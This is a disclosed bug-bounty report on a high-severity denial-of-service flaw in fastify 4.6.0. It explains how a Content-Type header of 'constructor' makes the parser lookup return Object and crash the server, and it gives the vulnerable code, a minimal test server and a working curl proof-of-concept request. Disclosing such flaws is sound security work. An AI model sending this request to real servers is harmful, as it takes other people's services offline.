# Deny of service via malicious Content-Type

## Report Details
- **Report ID**: 1715536
- **URL**: https://hackerone.com/reports/1715536
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-09-28T14:43:13.723Z
- **Disclosed**: 2022-10-10T08:43:25.245Z

## Reporter
- **Username**: bitk
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: fastify

## Vulnerability Information
## Summary:

I found a way to crash a fastify@4.6.0  server with a single query on a minimal setup. 


The function `ContentTypeParser.getParser()` do not check properly if the requested content-type parser exists.

/lib/contentTypeParser.js:94
```javascript
ContentTypeParser.prototype.getParser = function (contentType) {
  if (contentType in this.customParsers) {
    return this.customParsers[contentType]
  }

...
```

If an attacker send `constructor` or any default Object attribute, the function will return something unexpected instead of a parser, here the function returns `[Function: Object]`.

Then the `parser.fn` function is called.
/lib/contentTypeParser.js:94
```javascript
    const result = parser.fn(request, request[kRequestPayloadStream], done)
```

Because `parser.fn` is undefined, the application crashes.




## Steps To Reproduce:

I used the code provided in the [documentation](https://www.fastify.io/docs/latest/Guides/Getting-Started/)


index.js
```javascript
const fastify = require('fastify')({
  logger: true
})

// Declare a route
fastify.get('/', function (request, reply) {
  reply.send({ hello: 'world' })
})

// Run the server!
fastify.listen({ port: 3000 }, function (err, address) {
  if (err) {
    fastify.log.error(err)
    process.exit(1)
  }
  // Server is now listening on ${address}
})
```

Start the server:

```
> node index.js
{"level":30,"time":1664375818521,"pid":8587,"hostname":"localhost","msg":"Server listening at http://127.0.0.1:3000"}

```

When the server is ready, send the following POST  request

```
> curl -X POST http://127.0.0.1:3000 -H 'Content-Type: constructor'
curl: (52) Empty reply from server
```

The server had crashed with 

```
TypeError: parser.fn is not a function
```

## Impact

A malicious actor can crash any fastify server as long as they are able to send a `Content-type` header.

## Attachments
No attachments
